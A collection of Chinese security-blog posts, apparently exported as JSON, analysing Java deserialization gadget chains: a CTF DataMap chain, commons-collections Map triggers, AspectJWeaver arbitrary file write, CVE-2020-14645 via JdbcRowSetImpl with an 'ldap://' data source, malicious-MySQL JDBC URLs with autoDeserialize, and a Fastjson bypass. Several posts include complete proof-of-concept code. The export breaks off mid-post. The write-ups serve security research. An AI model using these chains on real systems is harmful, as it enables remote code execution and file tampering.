[{"title":"no RCE反序列化链构造","url":"/2021/03/12/no-RCE反序列化链分析/","content":"\n## 前言\n\n看到蚂蚁金服出了一个java web题目no rce [链接](https://mp.weixin.qq.com/s/yQ-00YaykUe41S0DdlgoiQ),文中的jdbc mysql 反序列化 和 AspectJWeaver反序列化在之前的文章中都有分析。本文章主要分析下出题人利用datamap替换了cc链中的lazymap来构造利用链。\n\n## 分析\n\n具体的lazymap利用链再上一篇文章中已经给出了分析。这里在hashset -> hashmap 以及最后SimpleCache.put()触发这部分都不在分析，直接复制过来用即可。主要分析datamap的触发流程。\n\n```\nHashSet.readObject()\n    HashMap.put()\n        HashMap.hash()\n            DataMap$Entry.hashcode\n                DataMap$Entry.getValue()\n                    DataMap.get()\n                        SimpleCache$StorableCachingMap.put()\n                            SimpleCache$StorableCachingMap.writeToPath()\n                                FileOutputStream.write()\n```\n\n\n\n首先我们看datamp的实现\n\n![image-20210312111446859](./no-RCE反序列化链分析/image-20210312111446859.png)\n\n通过给出的利用链我们可以知道主要是使用DataMap.get()触发整个流程\n\n![image-20210312111607189](./no-RCE反序列化链分析/image-20210312111607189.png)\n\n对比lazymap 可以看到我们这里要使用到的两个点 this.wrapperMap.get(key) this.values.put() 前者是为了传入content的值，后者是为了触发StorableCachingMap.put()到最后的写文件流程。\n\n根据datamap的构造方法可以明白我们要创建一个Datamap() 切需要构造wrapperMap和values两个值满足上述的条件。于是有：\n\n```java\nDataMap dataMap = new DataMap(wrapperMap,(Map)simpleCache);\n```\n\n又因为需要通过this.wrapperMap.get(key) 获取到content所以我们要创建这样一个hashMap()以便操作。\n\n```java\nHashMap wrapperMap = new HashMap();\nwrapperMap.put(path,content);\n```\n\n通过this.wrapperMap.get(key) 获取到content内容。 在之前的AspectJWeaver利用链分析中我们知道最后传入两个参数也就是put中对应的两个参数 key为 文件上传的路径 v为文件写入的内容。现在content已经想办法通过hashMap.get方法传入了，那么key这个值我们如何传入呢？\n\n在DataMap中实现了Entry这样一个私有类，他在实例话的时候获取了一个参数并给this.key赋值然后通过getValue方法触发DataMap.this.get(this.key)将path参数传入。\n\n![image-20210312112348193](./no-RCE反序列化链分析/image-20210312112348193.png)\n\n于是有如下代码：\n\n```java\nConstructor ctorEntry = Class.forName(\"CTF.checker.DataMap$Entry\").getDeclaredConstructors()[0];\nctorEntry.setAccessible(true);\nObject entry = ctorEntry.newInstance(dataMap,path);\n```\n\n最后看下DataMap$Entry.hashCode()\n\n![image-20210312112815246](./no-RCE反序列化链分析/image-20210312112815246.png)\n\n可以看到这里调用了this.getValue()至此整个反序列化构成。\n\n```\nDataMap$Entry.hashcode\n\tDataMap$Entry.getValue()\n\t\tDataMap.get()\n```\n\n\n\n## 完整poc\n\n```\npackage CTF\n\nimport checker.DataMap;\nimport cn.hutool.core.codec.Base64;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.Map;\n\n\n/**\n * HashSet.readObject()\n *     HashMap.put()\n *         HashMap.hash()\n *             DataMap$Entry.hashcode\n *                 DataMap$Entry.getValue()\n *                     DataMap.get()\n *                         SimpleCache$StorableCachingMap.put()\n *                             SimpleCache$StorableCachingMap.writeToPath()\n *                                 FileOutputStream.write()\n */\n\npublic class AspectJWeaver {\n\n    public static void main(String[] args) throws Exception {\n        byte[] content = Base64.decode(\"YWhpaGloaQ==\");\n        String path = \"/tmp/1.txt\";\n\n        Class aspectJWeaver = Class.forName(\"org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap\");\n        Constructor ctor = aspectJWeaver.getDeclaredConstructor(String.class, int.class);\n        ctor.setAccessible(true);\n        Object simpleCache = ctor.newInstance(\"\", 2);\n\n        HashMap wrapperMap = new HashMap();\n        wrapperMap.put(path,content);\n\n        DataMap dataMap = new DataMap(wrapperMap,(Map)simpleCache);\n\n        Constructor ctorEntry = Class.forName(\"checker.DataMap$Entry\").getDeclaredConstructors()[0];\n        ctorEntry.setAccessible(true);\n        Object entry = ctorEntry.newInstance(dataMap,path);\n\n        HashSet hashSet = new HashSet(1);\n        hashSet.add(\"foo\");\n\n        Field f = null;\n        try {\n            f = HashSet.class.getDeclaredField(\"map\");\n        } catch (NoSuchFieldException e) {\n            f = HashSet.class.getDeclaredField(\"backingMap\");\n        }\n        f.setAccessible(true);\n        HashMap innimpl = (HashMap) f.get(hashSet);\n\n        Field f2 = null;\n        try {\n            f2 = HashMap.class.getDeclaredField(\"table\");\n        } catch (NoSuchFieldException e) {\n            f2 = HashMap.class.getDeclaredField(\"elementData\");\n        }\n        f2.setAccessible(true);\n\n        Object[] array = (Object[]) f2.get(innimpl);\n\n        Object node = array[0];\n        if(node == null){\n            node = array[1];\n        }\n\n        Field keyField = null;\n        try{\n            keyField = node.getClass().getDeclaredField(\"key\");\n        }catch(Exception e){\n            keyField = Class.forName(\"java.util.MapEntry\").getDeclaredField(\"key\");\n        }\n\n        keyField.setAccessible(true);\n        keyField.set(node, entry);\n\n\n        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);\n        oos.writeObject(hashSet);\n        oos.close();\n        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));\n        ois.readObject();\n\n    }\n}\n\n```\n\n\n\n","tags":["java"]},{"title":"反序列化Map触发方式整理之DualHashBidiMap(有部分利用链未写完 有空补充)","url":"/2021/03/02/反序列化Map触发方式整理/","content":"\n## 简述\n\n​\t本文主要整理在反序列化利用链中通过Map.get()方式触发的函数，并进行流程分析。希望通过对多个触发流程的分析可以给大家更清晰了解如何构造出可利用的反序列化链，并在以后的审计中挖掘出新的利用链。\n\n## 简单回顾\n\n​\t针对于commons-collections系列的利用链目前构造的主要思路是通过LazyMap.get()方法进行调用transformer.transform来触发ChainedTransformer、InvokerTransformer进行反射来打到Runtime.getRuntime.exec()的目的。基本核心为TiedMapEntry->hashCode()/toString() 触发到LazyMap->get()。可以看到LazyMap.get()的核心内容如下图所示：\n\n![image-20210302100717442](./反序列化Map触发方式整理/image-20210302100717442.png)\n\n所以在挖掘的时候我们可以缩小目标到寻找一个Map，在这个Map中，调用了transformer.transform，并且transformer的值可控。便可进一步修改整个利用链达到自己的目的。\n\n## 分析\n\n​\t在找寻这类方法时要满足两个条件：\n\n​\t1、因为是反序列化漏洞的利用，因此我们寻找的函数需要继承于Serializable满足可被序列化的条件。\n\n​\t2、在重写的readObject()中需要调用一些方法来触发之后的流程。这个在后续分析中可以更清晰的理解。\n\n通过利用链中调用的Map类以此分析理解整体的构造流程。\n\n### DualHashBidiMap\n\n```\n利用条件：\ncommons-collections-3.1.jar or commons-collections-3.2.1.jar\n\n触发过程：\norg.apache.commons.collections.bidimap.DualHashBidiMap->readObject()\n\torg.apache.commons.collections.bidimap.DualHashBidiMap->putAll()\n\t\torg.apache.commons.collections.bidimap.DualHashBidiMap->put()\n\t\t\tjava.util.HashMap->containsKey()\n\t\t\t\tjava.util.HashMap->hash()\n\t\t\t\t\torg.apache.commons.collections.keyvalue.TiedMapEntry->hashCode()\n\t\t\t\t\t\torg.apache.commons.collections.keyvalue.TiedMapEntry->getValue()\n\t\t\t\t\t\t\torg.apache.commons.collections.keyvalue.LazyMap->get()\n```\n\n首先看到DualHashBidiMap类在重写readObject()方法的时候调用了一个putAll()方法，进一步跟入。\n\n![image-20210302101952009](./反序列化Map触发方式整理/image-20210302101952009.png)\n\n可以看到这里调用了put()方法进行了this.maps[].containsKey()方法调用。\n\n![image-20210302102334576](./反序列化Map触发方式整理/image-20210302102334576.png)\n\n通过查看HashMap()的方法我们可以看到，在HashMap.containsKey()方法中进行了hash(key)的操作。而在该方法中进行了key.hashCode()方法的调用。\n\n![image-20210302102835076](./反序列化Map触发方式整理/image-20210302102835076.png)\n\n进一步观察TiedMapEntry这个类我们可以看到在该类的方法中有三个函数均调用了getValue()操作，也就是说这三个方法在构造时我们都可以利用。\n\n![image-20210302103212596](./反序列化Map触发方式整理/image-20210302103212596.png)\n\n在该类的getValue()方法中调用了this.map.get(this.key)方法。\n\n至此我们走到了利用链的最后一环也就是文章开头所说的CC系列的transformer调用触发点。\n\n整个利用链调用的类已经看完了接下来简单说明下构造所要做的事情。\n\n首先需要生成一个DualHashBidiMap()作为反序列化调用in.readObject()的入口出发点。当反序列化触发的时候会调用putAll方法()该方法接受一个Map参数，进一步调用put()方法 因为后续要触发HashMap.containsKey()方法，在put方法中调用的是this.map[0].containsKey(key) 也就是说我们开始构造DualHashBidiMap()时就需要生成一个HashMap()\n\n```java\nprotected DualHashBidiMap(Map normalMap, Map reverseMap, BidiMap inverseBidiMap) {\n        super(normalMap, reverseMap, inverseBidiMap);\n    }\n```\n\n而在这里该类构造方法时是一个protected方法，所以我们需要通过反射进行调用。\n\n```java\nClass cls = Class.forName(\"org.apache.commons.collections.bidimap.DualHashBidiMap\");\nConstructor ctor = cls.getDeclaredConstructor(Map.class, Map.class, BidiMap.class);\nctor.setAccessible(true);\nObject payload_instance = m_ctor.newInstance([Map], null, null);\n```\n\n在上面说到构造时我们需要传入一个HashMap()，由于在后续需要触发到TiedMapEntry.hashcode()在上面代码分析中我们知道HashMap会调用key.HashCode()方法，因此我们要将HashMap的key设置为TiedMapEntry。又因为需要到LazyMap.get()而这里的也就是说需要在构造TiedMapEntry时将map设置为LazyMap。同时为了触发transformer需要在构造LazyMap时设置factory为transformer类型。至此利用链构造成功。\n\n```java\nTransformer transformerChain = new ChainedTransformer(transformers);\nMap lazyMap = LazyMap.decorate(new HashMap(), transformerChain);\nTiedMapEntry entry = new TiedMapEntry(lazyMap, \"haha\");\n    \nMap<String, Object> hashMap = new HashMap<String, Object>();\nhashMap.put(\"test\", entry);\n\nClass cls = Class.forName(\"org.apache.commons.collections.bidimap.DualHashBidiMap\");\nConstructor ctor = cls.getDeclaredConstructor(Map.class, Map.class, BidiMap.class);\nctor.setAccessible(true);\nObject payload_instance = m_ctor.newInstance(hashMap, null, null);\n```\n\n\n\n### HashSet\n\n```\n利用条件：\ncommons-collections-3.1.jar\n\n触发过程：\njava.util.HashSet->readObject()\n\tjava.util.HashMap->put()\n\t\tjava.util.HashMap->hash()\n\t\t\torg.apache.commons.collections.keyvalue.TiedMapEntry->hashCode()\n\t\t\t\torg.apache.commons.collections.keyvalue.TiedMapEntry->getValue()\n\t\t\t\t\torg.apache.commons.collections.map.LazyMap->get()\n```\n\n### Hashtable\n\n```\n利用条件：\ncommons-collections-3.1.jar - commons-collections-3.2.1.jar \n\n触发过程：\njava.util.Hashtable->readObject()\n\tjava.util.Hashtable->reconstitutionPut()\n\t\torg.apache.commons->collections.map.AbstractMapDecorator.equals()\n\t\t\tjava.util.AbstractMap->equals()\n\t\t\t\torg.apache.commons.collections.map.LazyMap->get()\n\njava.util.HashSet->readObject()\n\tjava.util.HashMap->put()\n\t\tjava.util.HashMap->hash()\n\t\t\torg.apache.commons.collections.keyvalue.TiedMapEntry->hashCode()\n\t\t\t\torg.apache.commons.collections.keyvalue.TiedMapEntry->getValue()\n\t\t\t\t\torg.apache.commons.collections.map.LazyMap->get()\n```\n\n","tags":["java"]},{"title":"AspectJWeaver利用链分析","url":"/2021/02/23/AspectJWeaver利用链分析/","content":"\n## AspectJWeaver 利用链分析\n\n利用链如下：\n\n```\nGadget chain:\nHashSet.readObject()\n    HashMap.put()\n        HashMap.hash()\n            TiedMapEntry.hashCode()\n                TiedMapEntry.getValue()\n                    LazyMap.get()\n                        SimpleCache$StorableCachingMap.put()\n                            SimpleCache$StorableCachingMap.writeToPath()\n                                FileOutputStream.write()\n```\n\n该利用链利用条件需要org.aspectj:aspectjweaver在1.9.2版本以下。触发点在SimpleCache$StorableCachingMap。这里我创建的是maven项目在pom.xml中添加：\n\n```xml\n<dependency>\n            <groupId>org.aspectj</groupId>\n            <artifactId>aspectjweaver</artifactId>\n            <version>1.9.2</version>\n</dependency>\n```\n\n在org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap类中我们可以看到该类为一个私有类，切继承HashMap，在该类中重写了父类的put方法。\n\n![image-20210223101253016](/img/media/AspectJWeaver利用链分析/image-20210223101253016.png)\n\n该类在重写的put方法中调用了一个writeToPath方法，而这个利用链就是通过这个方法进行的文件写入。\n\n![image-20210223101045501](/img/media/AspectJWeaver利用链分析/image-20210223101045501.png)\n\n在该方法中利用FileOutputStream写入文件，writeToPath接收的两个参数key为文件的路径，valueBytes则是写入到文件的内容。\n\n![image-20210223101732662](/img/media/AspectJWeaver利用链分析/image-20210223101732662.png)\n\n到这里思路就明确了。触发点在put函数，并且该类继承自HashMap，直接利用lazymap+TiedMapEntry去触发。\n\n```\nprivate void readObject(java.io.ObjectInputStream s)\n        throws IOException, ClassNotFoundException {\n        // Read in the threshold (ignored), loadfactor, and any hidden stuff\n        \n        \t\t\t\t\t\t\t........\n\n            // Read the keys and values, and put the mappings in the HashMap\n            for (int i = 0; i < mappings; i++) {\n                @SuppressWarnings(\"unchecked\")\n                    K key = (K) s.readObject();\n                @SuppressWarnings(\"unchecked\")\n                    V value = (V) s.readObject();\n                putVal(hash(key), key, value, false, false);\n            }\n        }\n    }\n```\n\n利用链序列化后的内容为一个HashMap,在反序列化的时候调用HashMap.readObject()，在这里调用hash(key)而key为TiedMapEntry从而调用TiedMapEntry.hashCode()\n\n![image-20210223112143365](/img/media/AspectJWeaver利用链分析/image-20210223112143365.png)\n\n这里调用了getValue()函数，跟进getValue()函数，进一步调用了this.map.get(this.key);方法。\n\n![image-20210223112429478](/img/media/AspectJWeaver利用链分析/image-20210223112429478.png)\n\n而TiedMapEntry中存放的map为lazymap，key就是传入的path，在lazymap.get(key)中调用了this.map.put(key)方法。此时的map为我们构造的StoreableCachingMap，而获取的value值为this.factory.transform(key); 也就是一开始我们通过new ConstantTransformer(content)传入的内容。ConstantTransformer设置了this.iConstant的变量，而这里的this.factory.transform(key)就是获取this.iConstant的值。\n\n![image-20210223112556146](/img/media/AspectJWeaver利用链分析/image-20210223112556146.png)\n\n![image-20210223113515820](/img/media/AspectJWeaver利用链分析/image-20210223113515820.png)\n\n从而调用了StoreableCachingMap.put(path, content) --> this.writeToPath(path, content) 从而写入文件。\n\n这里我直接用了HashMap去操作，修改值的时候需要便利，[ysoserial](https://github.com/frohoff/ysoserial)中给的是使用HashSet.readObject去操作，原理都一样就是HashSet方便直接修改HashMap的值，而我这里需要遍历修改。\n\nPayload\n\n```java\n\t\t\t\tbyte[] content = Base64.decode(\"YWhpaGloaQ==\");\n        String path = \"/tmp/1.txt\";\n\n        Class aspectJWeaver = Class.forName(\"org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap\");\n        Constructor ctor = aspectJWeaver.getDeclaredConstructor(String.class, int.class);\n        ctor.setAccessible(true);\n        Object obj = ctor.newInstance(\"\",2);\n\n        Transformer transformer = new ConstantTransformer(content);\n\n        Map lazyMap = LazyMap.decorate((Map)obj, transformer);\n\n        TiedMapEntry entry = new TiedMapEntry(lazyMap, path);\n\n        HashMap hashMap = new HashMap();\n        hashMap.put(\"foo\", \"a\");\n\n        Field field = HashMap.class.getDeclaredField(\"table\");\n        field.setAccessible(true);\n\n        Object[] array = (Object[]) field.get(hashMap);\n        int a = 0;\n        for(int i=0;i<array.length;i++)\n            if(array[i]!=null)\n                a=i;\n        Object node = array[a];\n        Field keyField = node.getClass().getDeclaredField(\"key\");\n        keyField.setAccessible(true);\n        keyField.set(node, entry);\n\n        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);\n        oos.writeObject(hashMap);\n        oos.close();\n        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));\n        ois.readObject();\n```\n\n\n\n## 总结\n\n```\n \t\t\t\t\t ___ key: TiedMapEntry\nHashMap---|\n\t\t\t\t\t|___ value: (int)\n\t\t\t\t\t\n \t\t\t\t\t \t\t  ___ key: lazymap\nTiedMapEntry---|\n\t\t\t\t\t     |___ value: \"/tmp/123.txt\"\n\t\t\t\t\t     \n \t\t\t\t\t ___ key: StoreableCachingMap\nlazymap---|\n\t\t\t\t\t|___ value: new ConstantTransformer(\"123\")\n\t\t\t\t\t\nStoreableCachingMap.put(\"/tmp/123.txt\",\"123\")\n\nthis.writeToPath(\"/tmp/123.txt\",\"123\".getBytes())\n\nFileOutputStream()\n\t\t\t\t\t  \n```\n\n\n\n\n\n\n\n","tags":["JAVA"]},{"title":"CVE-2020-14645分析","url":"/2020/07/27/CVE-2020-14645反序列化分析/","content":"\n    首先给出payload地址：https://www.cnblogs.com/potatsoSec/p/13307315.html\n\n## 分析\n\n根据payload给出的内容可以看出主要触发点在com.tangosol.util.extractor.UniversalExtractor类中\n\n![](/img/media/CVE-2020-14645分析/2020-07-27-14-57-30.png)\n\n可以看出该类与我之前分析的CVE-2020-2555反序列化的原理相似，都是在extract。进行invoke调用。这里可以看到虽然在if中包含了getMethod().invoke(oTarget, this.m_aoParam)这样的反射关键字，但是targetPrev参数是用transient修饰过的也就是说这个参数无法进行反序列化，并不能利用。这里需要跟入else的extractComplex方法继续查看。\n\n![](/img/media/CVE-2020-14645分析/2020-07-27-15-00-54.png)\n\n可以看到这里有个findMethod的方法，在函数的结束返回了一个method.invoke(oTarget, aoParam)而这里的oTarget和this.m_aoParam是可控的，一个在调用时传参数，一个在实力化时被赋值。\n\n查看findMethod可以发现在这里进行了clz.getMethod(sName, aclzParam),方法通过类、方法名以及方法的参数类型数组来反射返回该类中的特定方法。配合在return处的invoke整个反射链就形成了。接下来需要了解如何触发。\n\n![](/img/media/CVE-2020-14645分析/2020-07-27-15-04-10.png)\n\n第一反应是我们需要在extractComplex方法中进入else判断。这里需要this.isPropertyExtractor()返回值为false,也就是需要this.m_fMethod的值为true.但这里的m_fMethod也被transient修饰了，我们无法利用。所以只能查看if中的findMethod方法是否可以利用。\n\n```\n    public boolean isPropertyExtractor() {\n        return !this.m_fMethod;\n    }\n\n    if (fProperty) {\n            String sBeanAttribute = Character.toUpperCase(sCName.charAt(0)) + sCName.substring(1);\n\n            for(int cchPrefix = 0; cchPrefix < BEAN_ACCESSOR_PREFIXES.length && method == null; ++cchPrefix) {\n                method = ClassHelper.findMethod(clzTarget, BEAN_ACCESSOR_PREFIXES[cchPrefix] + sBeanAttribute, clzParam, false);\n            }\n        } else {\n            method = ClassHelper.findMethod(clzTarget, this.getMethodName(), clzParam, false);\n        }\n```\n\n可以看到这里使用了sCName参数，该参数在UniversalExtractor类实力化的时候被赋值。\n\n![](/img/media/CVE-2020-14645分析/2020-07-27-15-13-00.png)\n\n跟入init()的getCanonicalName方法可以看到，因为这里的参数是this也就是本身，所以这里sName会为空然后进入if判断中\n\n![](/img/media/CVE-2020-14645分析/2020-07-27-15-13-43.png)\n\n```\n    public static <T extends Remotable> String getValueExtractorCanonicalName(Object oLambda) {\n        if (oLambda instanceof AbstractRemotableLambda) {\n            AbstractRemotableLambda lambda = (AbstractRemotableLambda)oLambda;\n            return CanonicalNames.computeValueExtractorCanonicalName(((MethodReferenceIdentity)lambda.getId()).getImplMethod() + \"()\", (Object[])null);\n        } else {\n            return null;\n        }\n    }\n```\n\n接下来进入computeValueExtractorCanonicalName看sName是如何赋值的。\n\n![](/img/media/CVE-2020-14645分析/2020-07-27-15-21-55.png)\n\n如果aoParam不为空，或者结尾不是()字符则会便利VALUE_EXTRACTOR_BEAN_ACCESSOR_PREFIXES查看开头是否符合这个名单。而这个名单中只有两个内容get和is\n\n![](/img/media/CVE-2020-14645分析/2020-07-27-15-23-19.png)\n\n在之前的extractComplex方法中我们看到了判断，也是类似的情况，也就是说。我们传入的方法需要以get和is开头，另外aoParam这个的值需要为null也就是说传入的方法不能带有参数。这里payload给出的方法是使用com.sun.rowset.JdbcRowSetImpl这个类，这个类大家应该都不陌生，fastjson最开始的利用链就是这个，在使用该类进行jdni连接时候会调用this.getDataSourceName()刚好满足get开头切无参数传递的方法。\n\n![](/img/media/CVE-2020-14645分析/2020-07-27-15-30-15.png)\n\n至此到extractor这里整个流程就结束了，接下来是如何利用extractor触发反序列化呢？根据payload利用的是PriorityQueue不难想到是compare方法触发。\n\n可以看到在com.tangosol.util.comparator.ExtractorComparator类中ExtractorComparator方法对this.m_extractor进行了赋值，compare方法中使用了extract(this.m_extractor)，也就是说我们将m_extractor赋值成我们需要的方法。然后利用PriorityQueue触发compare进行extract完成整个利用链。\n\n![](/img/media/CVE-2020-14645分析/2020-07-27-15-33-35.png)\n\n\n## 利用\n\n```\n        UniversalExtractor extractor = new UniversalExtractor(\"getDatabaseMetaData()\", null, 1);\n        final ExtractorComparator comparator = new ExtractorComparator(extractor);\n\n        JdbcRowSetImpl rowSet = new JdbcRowSetImpl();\n        rowSet.setDataSourceName(\"ldap://\" + command);\n        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);\n\n        Object[] q = new Object[]{rowSet, rowSet};\n        Reflections.setFieldValue(queue, \"queue\", q);\n        Reflections.setFieldValue(queue, \"size\", 2);\n```\n\n![](/img/media/CVE-2020-14645分析/2020-07-27-15-36-07.png)\n\n## 总结\n\n整个过程是根据现有的exp流程分析，如果有其他的思路希望师傅们指点。\n","tags":["JAVA"]},{"title":"yso总结","url":"/2020/07/27/yso总结/","content":"\n​\tysoserial工具总结下commit系列，主要是通过org.apache.commons.collections下的Transformer触发invoke反射，通过利用java反射调用执行命令，然后通过一些存在反序列化的库类，在反序列化的过程中触发transformer进行invoke反射执行命令。如lazyMap下的get value、PriorityQueue下的Comparator方法等等，而在org.apache.commons.collections的库中包含多个可以触发transformer的方法，从而可以使安全人员使用不同方法进行利用，然而ysoserial工具中出现了两种形式去触发。一种是InvokerTransformer使用java反射对我们执行的命令层层调用，另一种则是利用defineclass的方法，将编译好的字节码load进入内存中进行实例话，这里主要用到了TrAXFilter这个类，类的加载机制中提到，当类初始化的时候 static initializer在类载入时将自动执行（静态块内的代码）在该类初始化的时候进行了templatesImpl.newTransformer调用，从而触发了invoke反射链执行命令。\n\n​\t虽然在方法中看到了多个commonscollections的利用，其实只是使用了不同的类使用以上两种思路在反序列化的过程中触发transformer。这是主要的思路，可以依据这个进行深入挖掘新的反序列化利用链。\n\n","tags":["JAVA"]},{"title":"MySQL-JDBC 反序列化学习","url":"/2020/07/23/MySQL-JDBC反序列化学习/","content":"\n\n## 前言\n\n最近学习java的时候看到了[这样一篇文章](https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf)，内容是mysql-jdbc的反序列化利用。该漏洞只需要能够控制客户端的jdbc链接，在链接阶段就可以进行处发反序列化，于是开始了进一步研究。\n\n## JDBC\n\nJDBC（Java Data Base Connectivity,java数据库连接）是一种用于执行SQL语句的Java API，可以为多种关系数据库提供统一访问，它由一组用Java语言编写的类和接口组成。是Java访问数据库的标准规范。简单理解为链接数据库、对数据库操作都需要通过jdbc来实现。也就是说我们通常会使用JDBC接口会做三件事：\n\n1、链接数据库\n2、执行数据库语句\n3、JDBC返回数据库的执行结果\n\nJDBC对mysql连接形式为：\n```\njdbc:mysql://127.0.0.1:3306/mysql?user=root&pass=root\n```\n在？后可跟多个可选的参数\n\n## MySQL JDBC 反序列化\n\n在该blackhat的议题中提到了使用ServerStatusDiffInterceptor的方式去触发。提供了两个参数：\n\n```\nautoDeserialize     // 驱动程序是否应该自动检测和反序列化存储在BLOB字段中的对象\n\nqueryInterceptors   // 逗号分隔的类列表，这些类实\"com.mysql.cj.interceptors.QueryInterceptor\"的接口，应将其放置在查询执行之间来影响结果。\n```\n\n随后提供了利用链路及方法:\n\n![](/img/media/MySQL-JDBC/2020-07-22-11-12-09.png)\n\n```\njdbc:mysql://attacker/db?\nqueryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\n&autoDeserialize=true\n```\n\n当攻击者部署了恶意的mysql服务器，并且在可控的JDBC链接处将该payload发送过去，就会将payload执行的结果返回回来。接下来需要看该攻击是如何实现的。这里在本地使用payload的时候发现触发了4次接下来将分析如何触发该利用链，以及为何触发了4次。\n\n## 反序列化分析\n\n这里为了更深入的了解我跟了下jdbc连接数据库的流程：\n\n在数据库连接时会调用getConnection()方法去建立了连接，在com.mysql.cj.conf.ConnectionUrlParser将所有的参数进行分割。\n\n![](/img/media/MySQL-JDBC/2020-07-22-14-29-03.png)\n\n```\nscheme 数据库的连接类型\nauthority 数据库的连接地址及端口\npath 连接的数据库名称\nquery 带入执行的参数\n```\n\n随后又将query的内容进行分割，传入com.mysql.cj.jdbc.ConnectionImpl对propertySet进行设置。\n\n![](/img/media/MySQL-JDBC/2020-07-22-14-37-42.png)\n\n![](/img/media/MySQL-JDBC/2020-07-22-14-57-59.png)\n\n之后会与mysql进行初始连接，在NativeSession.class里会获取当前mysql的环境然后会触发一次查询\"SET NAMES utf\"\n\n随后会调用com.mysql.cj.protocol.a.NativeProtocol类中的sendQueryString，而在上述的利用链中我们可以得知在com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor中的preProcess及postProcess都会触发populateMapWithSessionStatusValues这个方法，而这个方法才是调用readObject方法的前置处罚点。这里可以看到sendQueryString方法中有两个地方分别调用了preProces和postProcess方法\n\n```\nif (this.queryInterceptors != null) {\n                T interceptedResults = invokeQueryInterceptorsPre(query, callingQuery, false);\n\n                if (interceptedResults != null) {\n                    return interceptedResults;\n                }\n            }\n            ....\nif (this.queryInterceptors != null) {\n                T interceptedResults = invokeQueryInterceptorsPost(query, callingQuery, rs, false);\n\n                if (interceptedResults != null) {\n                    rs = interceptedResults;\n                }\n            }\n```\n\n在第一次触发查询后会进入该方法调用invokeQueryInterceptorsPre()从而触发preProcess()方法\n\n![](/img/media/MySQL-JDBC/2020-07-22-15-25-24.png)\n\n![](/img/media/MySQL-JDBC/2020-07-22-15-51-28.png)\n\n随后执行了\"SHOW SESSION STATUS\" resultSetToMap中触发了getObject(),反序列化的数据就是执行\"SHOW SESSION STATUS\"查询的返回集。\n\n![](/img/media/MySQL-JDBC/2020-07-22-15-55-09.png)\n\n跟入com.mysql.cj.jdbc.result.ResultSetImpl#getObject 可以看到反序列化的触发点，当传入的数据为BLOB类型的时候会进行反序列化\n\n![](/img/media/MySQL-JDBC/2020-07-22-15-57-32.png)\n\n这里第一次触发了反序列化，接下来会触发SET autocommit=1查询。\n\n然后又会进入NativeProtocol#sendQueryString,这里会触发一次postProcess\n\n![](/img/media/MySQL-JDBC/2020-07-22-15-27-42.png)\n\n随后服务器因为执行了SHOW SESSION STATUS 会触发一次preProcess()\n\n进而在触发SET sql_mode='STRICT_TRANS_TABLES'查询\n\n然后进入NativeProtocol#sendQueryString触发一次postProcess\n\n至此整个流程结束。整个利用方法就明白了：\n\n1、在环境中有可利用的gadget。\n2、本地搭建恶意的mysql服务器，想办法修改SHOW SESSION STATUS返回集中的某个value，改为我们使用gadget生成的payload。\n3、在可控的jdbc连接处发送连接恶意服务器的请求。\n4、反序列化触发。\n\n这里SHOW SESSION STATUS读取的是系统表INFORMATION_SCHEMA.SESSION_STATUS的值，但是系统表是不允许修改的，所以需要想办法操纵返回的数据。可以[参考](https://github.com/codeplutos/MySQL-JDBC-Deserialization-Payload)也可以直接使用fnmsd师傅开发的[工具](https://github.com/fnmsd/MySQL_Fake_Server)。\n\n这里在学习的过程中发现师傅们还发现了另外一条链路在mysql cj的库为5.x的时候使用detectCustomCollations触发，由于该链路触发的方式和8.x触发的方式不一样，是使用的SHOW COLLATION只触发了一次反序列化，有兴趣的师傅们可以去看一下，这里大家可以参考\nhttps://www.anquanke.com/post/id/203086 fnmsd师傅给出了不同版本的mysql cj的利用方式。\n\n## 参考文章\n\nhttps://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf\nhttps://www.anquanke.com/post/id/203086\n\n","tags":["JAVA"]},{"title":"Fastjson 1.6.68 autotype bypass","url":"/2020/07/20/fastjson 1.6.68 autotype bypass/","content":"\n## fastjson 漏洞成因\n\n1. Fastjson提供了反序列化功能，允许用户在输入JSON串时通过\"@type\"键对应的value指定任意反序列化类名.\n2. Fastjson自定义的反序列化机制会使用反射生成上述指定类的实例化对象，并自动调用该对象的setter方法及部分getter方法.\n\n## 补丁对比\n\n通过https://github.com/alibaba/fastjson/compare/1.2.68%E2%80%A61.2.69 查看补丁的更新信息可以看到。\n\n在src/main/java/com/alibaba/fastjson/parser/ParserConfig.java中将原明文存储的期望类经自定义消息摘要函数转换为hash值并且新增了几个class对象。\n\n![](/img/media/Fastjson1.68/2020-07-20-14-08-58.png)\n\n这里借用[带头老哥的图](https://xz.aliyun.com/t/7878)\n\n![](/img/media/Fastjson1.68/2020-07-20-14-13-09.png)\n\n可以看到增加了对expectClass类，新增了三个方法分别为java.lang.Runnable、java.lang.Readable、java.lang.AutoCloseable\n\n## 